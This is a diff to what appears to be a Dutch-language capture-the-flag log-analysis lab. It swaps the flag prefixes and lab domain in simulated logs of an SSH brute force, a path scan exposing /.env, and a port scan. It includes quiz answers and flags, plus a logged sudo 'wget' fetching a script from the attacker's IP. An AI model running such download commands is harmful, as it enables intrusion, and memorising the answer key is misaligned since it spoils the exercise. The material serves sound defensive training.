@@ -24,7 +24,7 @@ Oct  3 02:11:45 srv-web01 sshd[1226]: Failed password for mdevries from 203.0.11
 Oct  3 02:11:48 srv-web01 sshd[1227]: Failed password for mdevries from 203.0.113.45 port 51016 ssh2
 Oct  3 02:11:51 srv-web01 sshd[1228]: Failed password for mdevries from 203.0.113.45 port 51017 ssh2
 Oct  3 02:11:55 srv-web01 sshd[1229]: Accepted password for mdevries from 203.0.113.45 port 51018 ssh2
-Oct  3 02:11:55 srv-web01 sshd[1229]: pam_unix(sshd:session): session opened for user mdevries(uid=1007) by (uid=0)  [soc-tag: JVT{geslaagde_brute_force}]
+Oct  3 02:11:55 srv-web01 sshd[1229]: pam_unix(sshd:session): session opened for user mdevries(uid=1007) by (uid=0)  [soc-tag: NM{geslaagde_brute_force}]
 Oct  3 02:12:40 srv-web01 sudo:  mdevries : TTY=pts/0 ; PWD=/home/mdevries ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh
 Oct  3 02:12:48 srv-web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by mdevries(uid=1007)
 Oct  3 02:13:05 srv-web01 CRON[1388]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
@@ -33,7 +33,7 @@ Oct  3 02:15:20 srv-web01 sshd[1301]: pam_unix(sshd:session): session opened for
 `;
 
 const ACCESS_LOG = `192.0.2.51 - - [03/Oct/2026:03:05:02 +0200] "GET / HTTP/1.1" 200 2310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
-192.0.2.51 - - [03/Oct/2026:03:05:03 +0200] "GET /css/stijl.css HTTP/1.1" 200 1840 "https://winkel.jvt.lab/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
+192.0.2.51 - - [03/Oct/2026:03:05:03 +0200] "GET /css/stijl.css HTTP/1.1" 200 1840 "https://winkel.nm.lab/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
 198.51.100.9 - - [03/Oct/2026:03:06:44 +0200] "GET /producten HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Safari/605.1"
 192.0.2.51 - - [03/Oct/2026:03:07:11 +0200] "GET /contact HTTP/1.1" 200 1990 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
 192.0.2.77 - - [03/Oct/2026:03:09:48 +0200] "GET /producten/koffie HTTP/1.1" 200 3050 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
@@ -47,11 +47,11 @@ const ACCESS_LOG = `192.0.2.51 - - [03/Oct/2026:03:05:02 +0200] "GET / HTTP/1.1"
 203.0.113.88 - - [03/Oct/2026:03:12:04 +0200] "GET /config.php HTTP/1.1" 403 289 "-" "dirsearch/0.4.3"
 203.0.113.88 - - [03/Oct/2026:03:12:05 +0200] "GET /server-status HTTP/1.1" 403 289 "-" "dirsearch/0.4.3"
 203.0.113.88 - - [03/Oct/2026:03:12:05 +0200] "GET /vendor/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
-203.0.113.88 - - [03/Oct/2026:03:12:06 +0200] "GET /.env HTTP/1.1" 200 742 "-" "dirsearch/0.4.3 (JVT{dotenv_gelekt})"
+203.0.113.88 - - [03/Oct/2026:03:12:06 +0200] "GET /.env HTTP/1.1" 200 742 "-" "dirsearch/0.4.3 (NM{dotenv_gelekt})"
 203.0.113.88 - - [03/Oct/2026:03:12:06 +0200] "GET /uploads/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
 203.0.113.88 - - [03/Oct/2026:03:12:07 +0200] "GET /old/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
 198.51.100.9 - - [03/Oct/2026:03:14:20 +0200] "GET /producten/thee HTTP/1.1" 200 2980 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Safari/605.1"
-192.0.2.77 - - [03/Oct/2026:03:15:58 +0200] "POST /contact HTTP/1.1" 200 640 "https://winkel.jvt.lab/contact" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+192.0.2.77 - - [03/Oct/2026:03:15:58 +0200] "POST /contact HTTP/1.1" 200 640 "https://winkel.nm.lab/contact" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
 192.0.2.51 - - [03/Oct/2026:03:16:40 +0200] "GET /favicon.ico HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
 198.51.100.9 - - [03/Oct/2026:03:18:02 +0200] "GET / HTTP/1.1" 200 2310 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Safari/605.1"
 `;
@@ -73,7 +73,7 @@ Oct  3 04:02:13 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0
 Oct  3 04:02:13 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44013 DPT=3306 FLAGS=SYN
 Oct  3 04:02:13 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44014 DPT=3389 FLAGS=SYN
 Oct  3 04:02:14 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44015 DPT=8080 FLAGS=SYN
-Oct  3 04:02:40 ids01 suricata[912]: [1:2001219:20] ET SCAN Possible TCP SYN port scan SRC=203.0.113.200 DST=10.0.5.20 classification=Attempted-Recon note=JVT{poortscan_gedetecteerd}
+Oct  3 04:02:40 ids01 suricata[912]: [1:2001219:20] ET SCAN Possible TCP SYN port scan SRC=203.0.113.200 DST=10.0.5.20 classification=Attempted-Recon note=NM{poortscan_gedetecteerd}
 Oct  3 04:05:02 fw01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=192.0.2.77 DST=10.0.5.20 PROTO=TCP SPT=52110 DPT=443 FLAGS=SYN
 `;
 
@@ -281,7 +281,7 @@ CS.registerRoom({
         { q: "Vanaf welk IP-adres komt de brute force?", answer: ["203.0.113.45"], hint: "Filter op 'Failed password' en kijk welk IP steeds terugkomt.", explain: "Alle mislukte pogingen en de uiteindelijke geslaagde login komen van 203.0.113.45." },
         { q: "Filter met /Failed password.*203.0.113.45/. Hoeveel mislukte pogingen van de aanvaller zie je?", answer: ["15"], hint: "Lees de teller onderaan de viewer af.", explain: "Er zijn 15 'Failed password'-regels vanaf 203.0.113.45 — op diverse gebruikersnamen, eindigend met 8 pogingen op mdevries." },
         { q: "Welke gebruiker werd uiteindelijk gekraakt (Accepted password vanaf het aanvaller-IP)?", answer: ["mdevries"], hint: "Zoek de 'Accepted password'-regel van 203.0.113.45.", explain: "Na de reeks mislukkingen lukt het bij mdevries: Accepted password for mdevries from 203.0.113.45." },
-        { q: "Wat is de vlag in de soc-tag bij de geopende sessie?", answer: ["JVT{geslaagde_brute_force}"], hint: "Kijk op de 'session opened'-regel direct onder de geslaagde login.", explain: "De analist tagde het incident: JVT{geslaagde_brute_force}." },
+        { q: "Wat is de vlag in de soc-tag bij de geopende sessie?", answer: ["NM{geslaagde_brute_force}"], hint: "Kijk op de 'session opened'-regel direct onder de geslaagde login.", explain: "De analist tagde het incident: NM{geslaagde_brute_force}." },
       ],
     },
 
@@ -325,7 +325,7 @@ CS.registerRoom({
         { q: "Vanaf welk IP-adres komt de poortscan?", answer: ["203.0.113.200"], hint: "Filter op 'UFW BLOCK' en kijk welk SRC-IP steeds terugkomt.", explain: "Alle geblokkeerde pogingen komen van SRC=203.0.113.200." },
         { q: "Welk doel-IP (DST) werd gescand?", answer: ["10.0.5.20"], hint: "Kijk naar het DST-veld op de BLOCK-regels.", explain: "De scan is gericht op DST=10.0.5.20." },
         { q: "Hoeveel verschillende poorten (DPT) probeerde de aanvaller (de geblokkeerde pogingen)?", answer: ["15"], hint: "Filter op 'UFW BLOCK' en tel de regels; elke BLOCK-regel is een andere DPT.", explain: "Er staan 15 geblokkeerde pogingen, elk naar een andere doelpoort: een klassieke poortscan." },
-        { q: "Wat is de vlag in de note van de Suricata IDS-alert?", answer: ["JVT{poortscan_gedetecteerd}"], hint: "Zoek de regel met 'suricata' en lees het note=-veld.", explain: "De IDS herkende het patroon en noteerde: JVT{poortscan_gedetecteerd}." },
+        { q: "Wat is de vlag in de note van de Suricata IDS-alert?", answer: ["NM{poortscan_gedetecteerd}"], hint: "Zoek de regel met 'suricata' en lees het note=-veld.", explain: "De IDS herkende het patroon en noteerde: NM{poortscan_gedetecteerd}." },
       ],
     },
 
@@ -335,7 +335,7 @@ CS.registerRoom({
         <p>Een website krijgt verkeer van echte bezoekers, maar ook van aanvallers die op zoek zijn naar vergeten
         beheerpagina's, back-ups en configuratiebestanden. Dat heet een <strong>directory-</strong> of
         <strong>padscan</strong>: automatisch honderden bekende paden proberen en kijken wat bestaat. In het
-        webserver-access-log (hier van <code>winkel.jvt.lab</code>) laat dat een duidelijk spoor na.</p>
+        webserver-access-log (hier van <code>winkel.nm.lab</code>) laat dat een duidelijk spoor na.</p>
 
         <h3>Wat je zoekt</h3>
         <ol>
@@ -365,13 +365,13 @@ CS.registerRoom({
       `,
       lab: {
         type: "logs",
-        title: "/var/log/nginx/access.log — winkel.jvt.lab",
+        title: "/var/log/nginx/access.log — winkel.nm.lab",
         lines: ACCESS_LOG,
       },
       questions: [
         { q: "Vanaf welk IP-adres komt de directory-/padscan?", answer: ["203.0.113.88"], hint: "Filter op 404 en kijk welk IP de meeste veroorzaakt.", explain: "203.0.113.88 vuurt tientallen verzoeken af naar niet-bestaande paden: de scanner." },
         { q: "Welk gevoelig pad gaf als enige status 200 (en was dus bereikbaar)?", answer: ["/.env", ".env"], hint: "Zoek tussen de 404's en 403's van de scanner de ene 200.", explain: "GET /.env gaf 200: het configuratiebestand was per ongeluk bereikbaar — een lek." },
-        { q: "Wat is de vlag in de User-Agent van die geslaagde /.env-aanvraag?", answer: ["JVT{dotenv_gelekt}"], hint: "Lees het laatste deel tussen aanhalingstekens op de /.env-regel.", explain: "De aanvaller markeerde zijn treffer in de User-Agent: JVT{dotenv_gelekt}." },
+        { q: "Wat is de vlag in de User-Agent van die geslaagde /.env-aanvraag?", answer: ["NM{dotenv_gelekt}"], hint: "Lees het laatste deel tussen aanhalingstekens op de /.env-regel.", explain: "De aanvaller markeerde zijn treffer in de User-Agent: NM{dotenv_gelekt}." },
         { q: "Waarom is de User-Agent 'dirsearch/0.4.3' hier zelf al een aanwijzing (IoC)?", options: ["Het is een scantool, geen gewone browser", "Het is een verouderde browser", "Het is een zoekmachine van Google", "Dat is een normale bezoeker"], answer: 0, explain: "Gewone bezoekers melden zich als browser; een scantool-naam in de User-Agent verraadt geautomatiseerd scannen." },
       ],
     },
